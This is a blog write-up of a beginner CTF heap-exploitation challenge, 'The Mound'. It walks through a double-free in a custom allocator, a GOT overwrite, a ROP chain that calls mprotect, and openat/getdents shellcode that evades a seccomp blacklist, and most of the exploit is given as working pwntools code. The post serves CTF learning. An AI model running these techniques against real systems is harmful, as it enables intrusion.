---
title:  "Getting things wrong: How I spent 24-hours on a beginner's CTF pwn"
date:   2021-08-09 21:19:12 +0800
author: "152334H"

lastmod:   2021-08-09 21:19:12 +0800

draft: false
subtitle: ""
description: "An unfinished pwn writeup, wrapped with the airs of regret."
tags: [ "writeup", "pwn" ]
categories: [ "CTF" ]

---

<!--more-->

_If you're only interested in the technical details for_ The Mound, _I have a minified version of this post on [ctfdump](https://github.com/IRS-Cybersec/ctfdump/tree/master/RaRCTF%202021/The%20Mound)_.

Back in May, I started work on the outlines of a special blogpost. It's working title was _Doing pwn fast: a personal strategy for speedpwning in CTFs_, and I scrapped it when I realised how luridly inefficient I can be in the process of pwning. The inefficiency – as revolting as it was – wasn't an immediate concern, and I moved on.

Fast forward to now. In the leadup to the [9th of August](https://en.wikipedia.org/wiki/National_Day_(Singapore)), I spent my weekend huddled in my house, itching away at [RaRCTF](https://ctftime.org/event/1342)'s toughest pwnable: an introductory heap CLI that _certain professionals_ finished within hours:

<p align="center">
<img src="image-20210809170637512.png">
</p>

I wasn't one of those professionals. Have a look at the scoreboard graph for the [group of experts](https://ctftime.org/team/77768) I happened to tag along with:

![](image-20210809171451524.png)

Read the graph: `Aug 8, 1PM` minus `Aug 7, 1AM`. Accounting for sleep, I spent about a full day on a regular glibc pwn challenge. In the spirit of the Sunk Cost Fallacy, I figured I'd invest _even more_ of my time into picking apart the challenge through this over-elaborate writeup. Crazy, right?

There's something cathartic, in writing all of this. A eulogy of sorts to the abandoned introspection I attempted in May. _Could I have done this challenge faster, if I'd went about things differently?_

Maybe, but that's not the question I'll be answering in this writeup. I made a number of mistakes in my approach to this challenge, mistakes that I'll be covering in detail here. In the future, I might try to generalise the problems I've identified here for a better rendition of _Doing pwn fast_, but for now:

# The Mound [800]

_The glibc heap is too insecure. I took matters into my own hands and swapped efficiency for security._

**Files**: mound.zip

```
Archive:  mound.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    18160  2021-08-06 09:14   mound/mound
      451  2021-08-06 04:38   ctf.xinetd
      566  2021-08-06 17:08   Dockerfile
      100  2021-08-06 16:43   setup.sh
       25  2021-08-06 04:39   start.sh
       22  2021-08-06 17:30   flag.txt
  2029224  2021-08-06 17:13   libc.so.6
```

Relevant details:

```sh
$ checksec mound/mound
[*] '/mound'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO     # !
    Stack:    No canary found   # !
    NX:       NX enabled
    PIE:      No PIE (0x400000) # !
$ seccomp-tools dump mound/mound
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x0a 0x00 0x40000000  if (A >= 0x40000000) goto 0014
 0004: 0x15 0x09 0x00 0x0000003b  if (A == execve) goto 0014
 0005: 0x15 0x08 0x00 0x00000142  if (A == execveat) goto 0014
 0006: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0014
 0007: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0014
 0008: 0x15 0x05 0x00 0x00000055  if (A == creat) goto 0014
 0009: 0x15 0x04 0x00 0x00000086  if (A == uselib) goto 0014
 0010: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0014
 0011: 0x15 0x02 0x00 0x0000003a  if (A == vfork) goto 0014
 0012: 0x15 0x01 0x00 0x00000038  if (A == clone) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x06 0x00 0x00 0x00000000  return KILL
$ ./libc-database/identify libc.so.6
libc6_2.31-0ubuntu9.1_amd64
```

The seccomp filter is a little bit interesting, but I'll cover it [later on](#using-win). It's also worth noting that `setup.sh` contains this line:

```sh
$ cat setup.sh
#!/bin/sh
mv /pwn/flag.txt /pwn/$(xxd -l 16 -p /dev/urandom).txt
```

## Working backwards

`mount` has a good number of functions: 

<p align="center">
<img src="image-20210807091923816.png">
</p>

There's a function named `win`; that seems rather important.

```c
ssize_t win() {
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF
  puts("Exploiting BOF is simple right? ;)");
  return read(0, buf, 0x1000uLL);
}
```

<p align="center">
<img src="image-20210807092139558.png">
</p>

The binary doesn't have PIE or stack canaries _or RELRO_ enabled, so the bulk of this challenge must be in gaining RIP control via a GOT overwrite.

## Program outline

This is `main()` (partially prettified):

```c
void *arr[16];    // .bss:0x404180
size_t sizes[16]; // .bss:0x404200
int main() {
  unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF
  unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF
  char s[0x110]; // [rsp+10h] [rbp-110h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  install_seccomp();
  puts("I am the witch mmalloc");
  puts("Force, Prime, Mind, Lore, Chaos, Orange, Einharjar, Poortho, Spirit, Red, Roman, Corrosion, Crust, Rust, all is known to me.");
  puts("It is, from all of my training, that I have seen the flaws in glibc heap.");
  puts("Welcome, fellow pwner, to The Mound");
  moundsetup();
  memset(s, 0, 0x100uLL);
  while ( 1 ) {
#define REJECT {puts("No."); break;}
    switch ( int opt = menu() ) {
      case 4: // free
        printf("Pile index: ");
        __isoc99_scanf("%d", &idx);
        if ( idx <= 0xF && arr[idx] ) {
          mfree(arr[idx]);
          sizes[idx] = 0LL;
        } else REJECT;
        break;
      case 3: // edit
        printf("Pile index: ");
        __isoc99_scanf("%d", &idx);
        if ( idx > 0xF || !arr[idx] || !sizes[idx] ) REJECT;
        getinput("New pile: ", (void *)arr[idx], sizes[idx]);
        break;
      case 1: // really bad things
        getinput("Pile: ", s, 0x100uLL);
        printf("Pile index: ");
        __isoc99_scanf("%d", &idx);
        if ( idx > 0xF ) REJECT;
        arr[idx] = strdup(s);
        sizes[idx] = strlen(s);
        break;
      case 2: // add
        printf("Size of pile: ");
        __isoc99_scanf("%d", &user_sz);
        if ( user_sz <= 0xFFF ) {
          printf("Pile index: ");
          __isoc99_scanf("%d", &idx);
          if ( idx > 0xF ) REJECT;
          arr[idx] = mmalloc(user_sz);
          sizes[idx] = 0LL;
          getinput("Pile: ", (void *)arr[idx], user_sz);
        }
        else puts("A bit too much dirt my friend.");
        break;
      default:
        puts("Cya later :p");
        exit(0);
    }
  }
}
```

That's pretty long. Let's break it up into two segments: the preamble, and the `while(1)` loop.

### Preamble

`main()` doesn't have a lot of variables.

```c
  unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF
  unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF
  char s[0x110]; // [rsp+10h] [rbp-110h] BYREF
```

The 3 variables here are user-editable, and we'll talk about them later. Just keep in mind that `user_sz` and `idx` are **unsigned** integers written to with `scanf("%d")` calls later on, and `s[]`  is written to with a non-overflowing, non-zero-terminating<sup>1</sup> `read()` call.

After this, `main()` runs a bunch of initialisers:

```c
  setvbuf(...);      // all 3 i/o streams are unbuffered
  install_seccomp(); // start seccomp filter as shown at the start of this writeup
  puts(...);    // intro message
  moundsetup(); // setup the "mound"; this challenge's heap implementation
  memset(s, 0, 0x100uLL); // don't think too much about this; s[] can still be used for a leak if you try hard enough
```

The only complicated function here is `moundsetup()`; skip ahead to [this part of the writeup](#mound) if you want to understand it. If not:

### `main()`'s loop

The CLI gives five options:

```
1. Add sand
2. Add dirt
3. Replace dirt
4. Remove dirt
5. Go home
```

Here's a skeleton script to deal with the options:

```python
from pwnscripts import *
context.binary = 'mound'
context.libc = 'libc.so.6'
r = context.binary.process()
def choose(opt: int): r.sendlineafter(b'> ', str(opt))
def strdup(s: bytes, i: int):
    choose(1)
    r.sendafter(b'Pile: ', s)
    r.sendlineafter(b'index: ', str(i))
def add(sz: int, idx: int, s: bytes):
    choose(2)
    assert sz < 0x1000
    assert len(s) <= sz
    r.sendlineafter('pile: ', str(sz))
    r.sendlineafter('index: ', str(idx))
    r.sendafter('Pile: ', s)
def edit(idx: int, s: bytes):
    choose(3)
    r.sendlineafter('index: ', str(idx))
    r.sendafter('pile: ', s)
def free(idx: int):
    choose(4)
    r.sendlineafter('index: ', str(idx))  
```

(5) just calls `exit(0)`, but the rest are more complex.

#### Add sand

```c
case 1: // really bad things
  getinput("Pile: ", s, 0x100uLL);
  printf("Pile index: ");
  scanf("%d", &idx);
  if ( idx > 0xF ) REJECT;
  arr[idx] = strdup(s);
  sizes[idx] = strlen(s);
  break;
```

This option is really weird. A user-inputted stream of bytes – not necessarily nul-terminated – are sent to `strdup`, and the resultant _glibc malloc'd string_ is stored at `arr[idx]`. This means that some of `arr[]`'s elements can be a mixture of _mound_ pointers, and actual glibc heap pointers.

It's also worth noting that the `str*` functions here can overflow, depending on whether the stack has extra nul-bytes or not.

#### Add dirt

```c
case 2: // add
  printf("Size of pile: ");
  scanf("%d", &user_sz);
  if ( user_sz <= 0xFFF ) {
    printf("Pile index: ");
    scanf("%d", &idx);
    if ( idx > 0xF ) REJECT;
    arr[idx] = mmalloc(user_sz);
    sizes[idx] = 0LL;
    getinput("Pile: ", (void *)arr[idx], user_sz);
  } else puts("A bit too much dirt my friend.");
break;
```

So this is a little bit interesting. The maximum allocation size is `0xfff`; `user_sz` is an `unsigned` so the single-bounded comparison works out. For some reason, `sizes[idx]` is set to `0` instead of `user_sz`. This is a little bit weird because of `case 3`:

#### Replace dirt

```c
case 3: // edit
  printf("Pile index: ");
  scanf("%d", &idx);
  if ( idx > 0xF || !arr[idx] || !sizes[idx] ) REJECT;
  getinput("New pile: ", (void *)arr[idx], sizes[idx]);
  break;
```

`sizes[idx]` has to be non-zero for the edit to pass. Since Option 2 sets `sizes[idx]` to 0, `arr[idx]` can only be edited if it's a pointer from the glibc heap in `case 1`, or if `sizes[idx]` can be modified somewhere else.

#### Remove dirt

```c
case 4: // free
  printf("Pile index: ");
  scanf("%d", &idx); // remember that `idx` itself is typed as unsigned.
  if ( idx <= 0xF && arr[idx] ) {
    mfree(arr[idx]);
    sizes[idx] = 0LL;
  } else REJECT;
  break;
```

This option calls `mfree()` on `arr[idx]`. There's only one bug here, and it's that `arr[idx]` is not zeroed.

So, this is a little bit odd. There are obvious Bad Things going on in these options, but the exploit required isn't immediately obvious here. I'll need to dive deeper into the `mound` implementation.

## Mound

The `mound` is kind of like the glibc heap, if it had nothing but the tcache.

At the start of the program, the `mound` grabs two big memory spaces from `mmap`:

```c
0x00000beef0000000 0x00000beef0400000 0x0000000000000000 rw-
0x00000dead0000000 0x00000dead0009000 0x0000000000000000 rw-
```

`0xbeef*` stores the actual data distributed by `mmalloc`; I'll call it `mound_data`. At the beginning of its life, the entirety of the `mound_data` segment constitutes the "top chunk" of the `mound`.

`0xdead*` stores the metadata for the `mound`, kind of like what `main_arena` does in glibc. The structure looks something like this:

```c
typedef struct mound_metadata {
    void *mound_base; // = 0xbeef0000000; never used for anything
    size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc.
    mcache_struct *mcache; // tcache, but for the mound.
    mchunk *top; // pointer to the top chunk
} mound_metadata; // sizeof(mound_metadata) == 0x8018
mound_metadata mound_arena; // cs:0xdead0000000
```

The new types in there are further defined like so:

```c
typedef struct mchunk {
    size_t id; // rand64() id.
    size_t sz; // the chunk size (inclusive of metadata)
    char data[0]; // length is dependent on the size provided to mmalloc() 
}
typedef struct mcache_entry {
    struct mchunk; // i.e. extend/inherit the mchunk structure here
    mcache_struct *mcache; // a copy of the mcache for safety verification
    mcache_entry *next; // next mcache entry; this is a linked list like the tcache.
}
#define MCACHE_MAX_BINS 0x18
typedef struct mcache_struct {
    uint8_t counts[MCACHE_MAX_BINS];
    mcache_entry *entries[MCACHE_MAX_BINS];
}
```

The most interesting part of each `mchunk` is (in my opinion, anyway) the `id` element. Every chunk is assigned a random 64-bit UUID (with a very small chance of collision<sup>2</sup>) upon allocation. When a chunk is freed, that ID gets chucked into the `mound_metadata` to protect the program against a double-free.

This might make a lot more sense if I give a flowchart of how things work:

![](Diagram.png)

Relevant macros:

```c
#define request2size(x) ((-x&0xf)+x+0x10) // x rounded up to nearest 0x10, plus 0x10. Applies for -ve numbers too.
#define csize2midx(x) ((x>>4)-2)
#define chunk2mem(p) ((void*)p+0x10)
#define mem2chunk(p) ((void*)p-0x10)
```

I copied and adapted some of these to python as well:

```python
def csize2midx(x:int): return (x>>4)-2
def midx2csize(i:int): return (i+2)<<4
def size2request(x:int): return x-0x10
def request2size(x:int): return x+0x10
def midx2rsize(i:int): return size2request(midx2csize(i))
```

With this high-level overview of the implementation in mind, I can return to the previous question: What are the consequences of sending a glibc heap pointer to `mfree()`?

### Mixing heap allocators

Simply freeing a glibc heap pointer will almost certainly produce an `exit(1)`:

```
1. Add sand
2. Add dirt
3. Replace dirt
4. Remove dirt
5. Go home
> 1
Pile: hi
Pile index: 0
1. Add sand
2. Add dirt
3. Replace dirt
4. Remove dirt
5. Go home
> 4
Pile index: 0
Mound: Double free detected
```

The relevant part of the code to check is the `find_id(c->id)` call:

```c
void find_id(size_t id) {
  for ( int i = 0; i <= 4095; ++i )
    if ( id == mound_arena.ids[i] ) {
      puts("Mound: Double free detected");
      exit(1);
    }
}
```

A typical `malloc_chunk` looks like this:

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
};
```

Because `c->id` occupies the same space as a `malloc_chunk`'s `mchunk_prev_size` member, the `prev_size` of the glibc heap chunk is taken as the `id` in  `find_id`. The glibc chunk pointers allocated by `strdup()` will _never_ be free, so `prev_size == id` should always be 0, and `find_id(c->id)` should always result in an error given a glibc heap chunk.

Or not.

## The Obvious Solution

It takes me a while, but I eventually realise that the preceding paragraph is false. Sequential malloc chunks can use the `prev_size` field to store user data:

![](prev_size.png)

This means that if I call `strdup("A"*0x17)` twice in succession, the first `strdup()` chunk allocated can be used to overwrite the `prev_size` of the 2nd `strdup()` chunk:

```python
strdup(b''.rjust(0x17,b'a'), 0)
strdup(b''.rjust(0x17,b'a'), 1)
edit(0, b''.rjust(0x17,b'a'))
```

![](prev_size2.png)

Using this method, the interpreted `mchunk->id` for a glibc heap chunk can be modified to any value within `range(0, 1<<56)`.

```python
# register an arbitrary 56-bit id onto the mound's free id list
def reg_id(id: int):
    strdup(b'a'*0x17, 0)
    strdup(b'a'*0x17, 1)
    edit(0, pack(id)[:7].rjust(0x17, b'a'))
    free(0)
```

What are the consequences of this? Adding a new `id` to `mound_arena.ids[]` is pretty useless; it would only make allocations _harder_ instead of easier. I could also try to get rid of an ID:

```python
def r64(): return randint(0, (1<<64)-1) # generate random ids. Unrelated to rand64bit()
def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[]
    strdup(b'a'*0x17, 0)
    strdup(b'a'*0x17, 1)
    edit(0, pack(r64())[:7].rjust(0x17, b'a'))
    free(1)
    edit(0, pack(id)[:7].rjust(0x17,b'a'))
    add(0x10, 2, b'a'*0x10)
```

Then I'd be able to free the same region of memory twice, like this:

```python
from ctypes import CDLL
libc = CDLL('libc.so.6')
# r = ...
libc.srand(libc.time(0)^r.pid) # pid will have to be guessed on remote
def rand64bit(): return libc.rand() + (libc.rand()<<32)
# ... omitted code ...
# ... make sure to account for rand() calls throughout code as well ...
while 1:
    add(sz=0x20, idx=0xf, b'hi')
	if not ((chunk_id := rand64bit()) >> 56): break
free(0xf)
rm_id(chunk_id)
free(0xf)
```

This is a classic tcache dup, except with the `mcache` instead. Once you accomplish this much, getting to `win()` isn't much of a challenge.

### Getting to `win()`

Right now, `mcache->entries[1] == [arr[0xf] -> arr[0xf]]`. `arr[0xf]->next` can be modified to anything, so long as `(mcache_entry*)(arr[0xf]->next)->mcache == mound_arena.mcache`. Taking a hint from the the definition, I'll try to point `->next` to `mound_arena.mcache-0x10`, because it's the only non-user-controlled region that happens to have an `mcache` pointer.

```python
add(0x20, 0xe, fit(0xbeef0000010, 0xdead0007ff8))
```

The linked list here is now `[arr[0xf] -> mound_arena+0x7ff8]`. As a reminder, the `mound_arena` looks like this:

```c
typedef struct mound_metadata {
    void *mound_base; // = 0xbeef0000000; never used for anything
    size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc.
    mcache_struct *mcache; // tcache, but for the mound.
    mchunk *top; // pointer to the top chunk
} mound_metadata; // sizeof(mound_metadata) == 0x8018
```

Right after the `mcache` is the `top` pointer. Pulling two items off of the mcache linked list will get the `top` pointer overwritten with user-controllable data:

```python
add(0x20, 0xd, 'hi')
add(0x20, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf']))
```

Here, I'm overwriting `mound_data.top` with a GOT pointer to gain RIP control:

```python
add(0x40, 0xb, pack(context.binary.sym.win)) # this will overwrite got.scanf()
```

And now the exploit reaches `win()`:

![](image-20210808125053271.png)

Simple enough, right?

## On the lengths I will go to fool myself: a novel, inferior exploit approach

Picture this: it's the middle of a Saturday afternoon. I'm looking at gdb in one window, and vim in the next. There's a little voice at the back of my head pleading me to attend to lunch and other bodily needs, but my eyes are entranced by the dark abyss of the Hex-Rays™ decompiler.

In short, I'm not really thinking straight. But what I _do_ notice, in my digital stupor, are the comments I have open in _Pseudocode-Q_<sup>3</sup>:

![](image-20210808184955019.png)

I had dismissed the immediate relevance of `strdup()` with the false reasoning I'd demonstrated at the end of [this section](#mixing-heap-allocators). I even got to work on rationalizing the apparent irrelevancy of `case 1/3`; my writeup had these lines at one point:

>  It's reasonable to assume that `strdup()` was introduced explicitly as an exploit vector for the challenge, so I can expect that there's a way to edit `mchunk_prev_size` without calling `free()`. On a wild guess, I expect that the final exploit involves modifying `sizes[idx]` and overflowing into glibc chunk metadata via `case 3`.

> Since there's currently no way to move forward with `case 1/3`, I'll shift my focus to the other two cases.

The bug I spotted here proved to be unnecessary. Altogether, you can solve the challenge without ever noticing the odd behaviour associated with `mmalloc(0)`. Nonetheless, the resulting exploit I cobbled together is interesting, unique enough that I'd prefer to leave the details available to the public.

So, let's talk about `mmalloc()`.

### `mmalloc()` and `mfree()`

`mmalloc()` is only ever called in `case 2`:

```c
case 2: // add
  if ( user_sz <= 0xFFF ) {
    // ... omitted ...
    if ( idx > 0xF ) REJECT;
    arr[idx] = mmalloc(user_sz);
    sizes[idx] = 0LL;
    getinput("Pile: ", (void *)arr[idx], user_sz);
  } else puts("A bit too much dirt my friend.");
break;
```

`mmalloc()` itself is defined a little oddly:

```c
__int64 *mmalloc(int user_sz) {
  int chunk_sz = request2size(user_sz); 
  if ( chunk_sz < 0 )  // not sure what the purpose of this is
    chunk_sz = (-user_sz & 0xF) + user_sz + 31;
  int midx = csize2midx(chunk_sz);
  if ( midx <= 0x17 && mound_arena.mcache->entries[midx] )
    return mcache_alloc(user_sz);
  return top_chunk_alloc(user_sz);
}
```

If I expand the macros, the bug becomes more obvious:

```c
__int64 *mmalloc(int user_sz) { // 0 <= user_sz <= 0xfff
  int chunk_sz = (-user_sz&0xf)+user_sz+0x10; // 0x10 <= chunk_sz <= 0x1010 
  if ( chunk_sz < 0 )  /* { ... } ignore */
  int midx = (chunk_sz>>4)-2; // -1 <= midx <= 0xff
  if ( midx <= 0x17 && mound_arena.mcache->entries[midx] ) // possible negative index here!!!
    return mcache_alloc(user_sz);
  return top_chunk_alloc(user_sz);
}
```

As a reminder, the `mcache` is structured like this:

```c
typedef struct mcache_struct {
    uint8_t counts[MCACHE_MAX_BINS];
    mcache_entry *entries[MCACHE_MAX_BINS];
}
```

`mcache->entries[-1]` _really_ refers to `mcache->counts[0x10:0x18]`. By filling up the `mcache` bins for `0x120 <= chunk_sz < 0x1a0`, we can get `mcache->entries[-1]` to point to **any arbitrary location**.

The subsequent call to `mmalloc_alloc(0)` has a small safety check, as I showed earlier in the flowchart:

```c
__int64 *mcache_alloc(int user_sz) { // user_sz = 0
  mcache_struct *mcache_ = mcache;  // [rsp+30h] [rbp-10h]
  int midx = csize2midx(request2size(user_sz)) // midx = -1, [rsp+2Ch] [rbp-14h]
  mcache_entry *e = mcache->entries[midx];  // [rsp+20h] [rbp-20h]
  mcache->entries[midx] = (mcache_entry *)e->fd;
  --mcache_->counts[midx];
  if ( mcache_ != (mcache_struct *)e->mcache ) { // ! need to ensure that (void*)entries[-1][2] == mcache
    puts("Mcache: Invalid verify");
    exit(1);
  }
  e->fd = e->mcache = 0LL;
  remove_id(e->id);
  return &e->mcache;
}
```

This effectively means that `mcache->entries[-1]` needs to point to a known region of user-controlled data, like the mound. I'll use this bug to allocate a fake chunk with a valid mcache size.

```python
def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=0xbeef0000010):
    if rid is None: rid = r64()
    return fit(rid, sz, mcache, fd)
add(0x20, 0, fake_mcache_entry(0x100))
add(1, 1, b'a') # chunk to be overflowed
fake_mcache_addr = 0xbeef0000100
for i,b in enumerate(pack(fake_mcache_addr)):
    chunk_sz = 0x120+i*0x10
    user_sz = chunk_sz - 0x10
    # TODO: how to get b > 0xf?
    for i in range(b): add(user_sz, 0xf-i, b'garbage')
    for i in range(b): free(0xf-i)
add(0, 2, b'') # trigger bug
free(0)
```

There's a `TODO` in there, and I'll explain. The problem with incrementing `mcache->counts[0x10:0x18]` one-by-one is that there aren't enough pointers to go around. By right, if `sizeof(arr[])` is only `0x10`, the maximum value for `mcache->counts[]` should be 0x10 as well.

I struggled with this for a while. The only way to put more pointers onto the mcache is to do a double-free, but the ID verification list got in the way of that. It was about at this point that I gained a partial understanding of the strategy outlined in [Fake IDs](#fake-ids), and I started work on an odd, roundabout method of achieving much of the same<sup>4</sup>:

 ```python
 # The substance of the exploit: getting mcache->entries[-1] to point to a fake mchunk
 for midx,b in tqdm((i+midxs.entries,b) for i,b in enumerate(pack(mound_data.fakechunk)) if b):
     def pad(s: bytes): return s.rjust(0x17, b'a')
     strdup(pad(b''), 0xf) # Remember that maximally, user_sz = 8 (mod 0x10) for a given glibc heap chunk.
     strdup(pad(b''), 0xe) # A string has a trailing nul-byte, so maximally strlen(s) = 7 (mod 0x10)
     add(midx, 2, b'hi')
     while (pred := r64bit())>>56: add(midx, 2, b'hi')
     for _ in range(b):    # continually double-free to boost ->counts[]
         free(2)
         edit(0xf, pad(pack(r64())[:7]))
         free(0xe)
         edit(0xf, pad(pack(pred)[:7]))
         add(midxs.incrementer, 5, b'a'*0x10)
 # , free it + a chunk right in front of it, overflow into the real freed chunk's metadata to
 add(midxs.bugged, 2, b'') # Get the fake chunk allocated,
 free(2) # free it + the chunk overlapping with the fake chunk
 free(1) # prepare to overwrite freed mchunk metadata such that ->next points to a fake chunk on the mound_arena
 add(midxs.fakechunk, 2, b'overwrite!'.ljust(0x10,b'a') + fake_mcache_entry(sz=999, fd=mound_arena.mcache-0x10))
 add(midxs.overflower, 1, 'hi') # put the fake mound_arena chunk on the mcache
 add(midxs.overflower, 1, fit(mound_data.mcache, context.binary.got['setvbuf'])) # replace mound_arena->top with the GOT
 add(midxs.got_overwriter, 2, pack(context.binary.sym.win)) # overwrite a good function with win() (I use scanf() here)
 ```

And that's how I used an mcache dup without ever noticing _I had an mcache dup_. An exploit method so abstruse, it remains 30x slower than the intended solution after optimisation<sup>5</sup>.

With that mess covered, I can route your attention back to `win()`. 

## Using `win()`

The seccomp filter for this challenge is mildly interesting. Normally, seccomp'd binaries have a _whitelist_ for permitted syscalls, but in this situation, there's only a _blacklist_ against a few. The blacklisted items give pause for thought: both `execve` and `open` are banned, and normally you'd use the former to pop a shell, and the latter for an [open-read-write](https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/) chain.

But before I get ahead of myself, let's talk about how to get to arbitrary syscalls first.

### Moving to rwx

There aren't a lot of gadgets in the main binary, so it might be better to leak libc first.

```python
R = ROP(context.binary)
R.raw(0x48*b'a')
R.puts(context.binary.got['read'])
R.win()
r.sendlineafter(';)\n', R.chain())
context.libc.symbols['read'] = unpack(r.recvline()[:6], 'all')
```

Once that's done, I can abuse gadgets in libc to convert the `mound_data` memory region into an rwx page:

```python
R = ROP(context.libc)
R.raw(0x48*b'a')
R.mprotect(mound_data.base, 0x400000, 7)
R.call(mound_data.shellcode)
r.sendlineafter(';)\n', R.chain())
```

This only makes sense if `mound_data.shellcode` actually points to an area of user-written shellcode. I handled this by writing shellcode to `mound_data` using `add()`, long before the mcache dup happens:

```python
# ... everything up until the first few add() calls ...
sc = ... # I'm about to cover this part.
sc = asm(sc) # don't call asm() twice
add(len(sc), 8, sc) # dump shellcode somewhere in mound_data for later use
# ... everything else, e.g. getting mcache dup ...
```

Figuring out _what_ shellcode to run isn't too difficult, if you have a [syscall reference](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) in hand. This challenge shows why you shouldn't use a seccomp blacklist: `open` might be banned, but [openat](https://linux.die.net/man/2/openat) certainly isn't. I'll start off with some shellcode to open the `/pwn/` folder:

```python
sc = shellcraft.pushstr('/pwn')
sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY)
sc+= 'mov QWORD PTR [{}], rax\n'.format(0xbeef0000000)
sc+= shellcraft.getdents64('rax', 0xbeef0010000, 0x10000) # use getdents() to list a directory
```

After that, I'll apply a basic assembly loop to search for `.txt`:

```python
sc+= shellcraft.mov('rax', 0xbeef0010000)
sc+= 'loop:\n'
sc+= 'inc rax\n'
sc+= 'cmp DWORD PTR [rax], {}\n'.format(u32('.txt'))
sc+= 'jne loop\n'
# End result: *(int*)rax == u32(".txt")
```

Since the flag's filename is always 0x20+4 bytes long, the beginning of the flag filename will be at `rax-0x20` , and I can use `openat` again to write the flag to stdout:

```python
sc+= 'lea rbx, [rax-0x20]\n'
sc+= 'mov rax, QWORD PTR [{}]\n'.format(0xbeef0000000)
sc+= shellcraft.openat('rax', 'rbx', 0)          # i.e. shellcraft.cat('rbx'), but
sc+= shellcraft.read('rax', 0xdead0000000, 100)  # because pwntools uses SYS_open 
sc+= shellcraft.write(1, 0xdead0000000, 100)     # I have to do this in 3 lines.
```

### Getting the flag

For reference, this is what the full script should look like at this point:

```python
from random import randint
from collections import namedtuple
from ctypes import CDLL
from pwnscripts import *

BEEF, DEAD = 0xbeef0000000, 0xdead0000000
mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010)
mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100)
midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2)

context.binary = 'mound'
context.libc = 'libc.so.6'
libc = CDLL('libc.so.6')
t = libc.time(0)
r = context.binary.process()
libc.srand(t^r.pid)

# I/O methods
def choose(opt: int): r.sendlineafter(b'> ', str(opt))
def strdup(s: bytes, i: int):
    choose(1)
    r.sendafter(b'Pile: ', s)
    r.sendlineafter(b'index: ', str(i))
def add(midx: int, idx: int, s: bytes):
    choose(2)
    sz = midx2rsize(midx)
    assert sz < 0x1000
    assert len(s) <= sz
    r.sendlineafter('pile: ', str(sz))
    r.sendlineafter('index: ', str(idx))
    r.sendafter('Pile: ', s)
def edit(idx: int, s: bytes):
    choose(3)
    r.sendlineafter('index: ', str(idx))
    r.sendafter('pile: ', s)
def free(idx: int):
    choose(4)
    r.sendlineafter('index: ', str(idx))

def csize2midx(x:int): return (x>>4)-2
def midx2csize(i:int): return (i+2)<<4
def size2request(x:int): return x-0x10
def request2size(x:int): return x+0x10
def midx2rsize(i:int): return size2request(midx2csize(i))
def r64bit(): return libc.rand()+(libc.rand()<<32) # emulate rand64bit
def r64(): return randint(0, (1<<64)-1) # a separate, unrelated function to produce random numbers

O_DIRECTORY, FLAG_LEN = 0x10000, 100 # use reasonably long values here
sc = '' # step 1: getting a directory listing
sc+= shellcraft.pushstr('/pwn') # put "/pwn" on the stack
sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) # use openat in lieu of open. rsp because of pushstr
sc+= 'mov QWORD PTR [{}], rax\n'.format(mound_data.base) # Store the resultant fd _somewhere_ accessible (mound_data.base)
sc+= shellcraft.getdents64('rax', mound_data.dents, 0x10000) # use getdents to list directory
# step 2: loop through the dents data to find the flag filename
sc+=shellcraft.mov('rax', mound_data.dents)
sc+= 'loop:\n'
sc+= 'inc rax\n'
sc+= 'cmp DWORD PTR [rax], {}\n'.format(hex(u32('.txt')))
sc+= 'jne loop\n'
# step 3: open the flag file, read to _somewhere_ (mound_arena.base), and write to stdout
sc+= 'lea rbx, [rax-0x20]\n'
sc+= 'mov rax, QWORD PTR [{}]\n'.format(mound_data.base)
sc+= shellcraft.openat('rax', 'rbx', 0)
sc+= shellcraft.read('rax', mound_arena.base, FLAG_LEN)
sc+= shellcraft.write(1, mound_arena.base, FLAG_LEN)
sc = asm(sc) # don't call asm() twice
add(1+csize2midx(request2size(len(sc))), 8, sc) # dump shellcode somewhere in mound_data for later use

# The Obvious Solution: mcache dup --> mound_arena.top overwrite --> GOT table edit to win()
def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[]
    strdup(b'a'*0x17, 5)
    strdup(b'a'*0x17, 6)
    edit(midxs.prev_size_editor, pack(r64())[:7].rjust(0x17, b'a'))
    free(midxs.fakeid_provider)
    edit(midxs.prev_size_editor, pack(id)[:7].rjust(0x17,b'a'))
    add(midxs.strdup, 7, b'a'*0x10)
for _ in range(3): r64bit() # There have been 3 rand64bit() calls so far; account for them.
while 1: # try adding until there's an ID with a null MSB
    add(midxs.mcache_dup, 0xf, b'hi')
    if not ((chunk_id := r64bit()) >> 56): break
free(0xf)
rm_id(chunk_id)
free(0xf) # mcache dup
